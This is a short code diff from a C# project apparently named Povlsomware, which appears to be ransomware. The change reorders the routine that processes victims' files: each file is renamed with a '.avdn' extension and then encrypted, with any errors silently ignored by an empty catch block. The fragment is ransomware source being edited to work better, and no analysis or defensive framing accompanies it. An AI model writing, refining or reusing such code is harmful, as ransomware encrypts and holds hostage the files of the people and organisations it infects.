@@ -207,10 +207,10 @@ namespace Povlsomware
             {
                 try
                 {
-                    EncryptFile(fileName);
                     string ext = ".avdn";
                     string newfileName = fileName + ext;
                     File.Move(fileName,newfileName);
+                    EncryptFile(newfileName);
                 }
                 catch
                 {
